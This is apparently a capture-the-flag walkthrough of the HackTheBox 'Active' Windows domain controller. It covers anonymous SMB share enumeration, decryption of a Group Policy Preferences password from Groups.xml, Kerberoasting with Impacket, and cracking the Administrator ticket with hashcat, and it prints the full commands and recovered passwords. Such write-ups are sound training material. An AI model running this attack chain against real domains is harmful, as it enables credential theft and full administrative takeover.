We got a null session and we only have access to one share.

```bash
┌──(kali㉿kali)-[~]
└─$ smbmap -u '' -p '' -H 10.10.10.100

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                

[+] IP: 10.10.10.100:445  Name: 10.10.10.100  Status: Authenticated
Disk            Permissions     Comment
----            -----------     -------
ADMIN$          NO ACCESS       Remote Admin
C$              NO ACCESS       Default share
IPC$            NO ACCESS       Remote IPC
NETLOGONNO      CCESS           Logon server share 
Replication     READ ONLY
SYSVOL          NO ACCESS       Logon server share 
Users           NO ACCESS

```

It is a complex directory so we better download everything an analize in our machine

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Active-10.10.10.100]
└─$ smbclient -N //10.10.10.100/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> tarmode
tarmode is now full, system, hidden, noreset, noverbose
smb: \> recurse
smb: \> prompt
smb: \> mget *

[...SNIP...]

┌──(kali㉿kali)-[~/Documents/Boxes/Active-10.10.10.100]
└─$ tree active.htb                 
active.htb
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

22 directories, 7 files
```

The file active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml define a group with one user called SVC_TGS and here we have an encrypted password

```bash
<?xml version="1.0" encoding="utf-8"?>

<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">

<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
	<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
</User>

</Groups>
```

This is a GPP encrypted pass, which we can decrypt using gpp-decrypt

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Active-10.10.10.100]
└─$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

Now we have SVC_TGS:GPPstillStandingStrong2k18 credentials which give us more access over SMB

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Active-10.10.10.100]
└─$ smbmap -u SVC_TGS -p 'GPPstillStandingStrong2k18' -H 10.10.10.100

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.100:445  Name: 10.10.10.100  Status: Authenticated
Disk          Permissions     Comment
----          -----------     -------
ADMIN$        NO ACCESS       Remote Admin
C$            NO ACCESS       Default share
IPC$          NO ACCESS       Remote IPC
NETLOGON      READ ONLY       Logon server share 
Replication   READ ONLY
SYSVOL        READ ONLY       Logon server share 
Users         READ ONLY
```

In Users share we find the user flag

Now, we have tried RDP and WinRM but nothing works, so we will use GetUserSPNs from Impacket to query the target for SPNs that are running under a user account

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Active-10.10.10.100]
└─$ /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-11-10 12:38:33.829336             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2be05ccb25d9ae8680922f58432619a8$3071920abae1a2c13eb44c1096d24fef54f11ee8570a0571d861348ce706a522c

[...SNIP...]
```

And now crack it with hashcat

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Active-10.10.10.100]
└─$ sudo hashcat -m 13100 Administrator.hash /usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
hashcat (v6.2.6) starting

[...SNIP...]

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2be05ccb25d9ae8680922f58432619a8$3071920abae1a2c13eb44c1096d24fef54f11ee8570a0571d861348ce706a522c0d51c841fea6ea2b0bb54c430852b3cd1fc6dbbeed12ed3fd8cb026b2c68fb523d9d45dbd5d3cafb1baa4dd5076caf55db0c910cb0bc09ba3cc42c2f9caffe98cac25d9b837399d176a9e456deee8cfc4466c2d792a3c5766f671c046eef6f6083e80eaed45ec1916b5b4f53ad96565bee02aff71bdb83c46b8602f884d2592919ad1efe35be1214181a43c10687a498ff6f810800802a1ea1588d6c80d0ff8cc8502678003849f7f35bc4cfedbca5bd3dc62da3e1f07c5e251210d2ffec1a30912c3ae3a4bf61ccacbae9539734b620820be9bea348bc50d269d83a58e1027dc7494fa4f624b9395a8080a26d65b05bbc2c9cc71a94194aec729930f0b68d671fb48031a95df81b156acc25eb34519021b42102f2bb62e5ab21e5350fbf8427791ab3ad21214a5a3dd88ba3c0668db0ef70d76c416e56f88c8f6aa5138b78e09182205b6dd256d99f4e574cdcca5c9c5e5018786efacf88830846eda47062763c64c65ba9f8a84b33352dedbbb8700a4c5d6212bf1a0edb0b0e90d66807262f0064e72b396653424976bfad9a505026b953d1116fbca0c244f2352c8382cfbeaab493d07137e03a68bbfcf3e13211fe586c7d8da20dae18656ccb759c9b5b3794de224ac8b87bcc830ebac22600f8351c5f240a02b940bbc575ef3a8a04af74f55fc14e05dff438f14cd4c1094e5c623b7968b2ee4a5dcc5a0ad501bed6d6e07c50c76ef97c3928e07bab322c265508c7cd012e3d74c2565cc4805ad3c0e9d0ea2185ef67863f65102b9c18bd4375ecd5df0f6cccc326b664616434d282f7ab176607d9bbac1ab13695138008da3a15a03034c222fd6d45ab2170415bcc33fd1b1c38b632d47078c22b4e97efa306f5b0df8219e2cbabf80a6dcd3461ede6be634d0f3e8f9d42b235b80b34db3cd988d56cd6acce4fea4366791d00ae2166d698c583f2cad8ccb04a1948572314ccae0117243bbfcae1cd63afe5ac149f06234fd27c4e1d88b0a447e38220601a9e1fa1c7aab5fb609d2b2bcac31c13ed42bf9da47a5a81f1e32e3c027fd530006b6f0bbe36d645d60d3b82a77616b1969ab07b12a72c14ca5a96a0d5e422d673557178cb316edc5ee95843a13d6db3dd0b2cc5ac63f03ada11ec8ee1b068d30dc3533e5b20827343e7ab4a7ececf886c6d9f673c940c8ab96cdc8ad23ad1c0bba469833080d09a9c5fa3397:Ticketmaster1968
                                                          
[...SNIP...]
```

We got the credentials Administrator:Ticketmaster1968 . Now we just connect to the SMB server and list C$ share or get access through psexec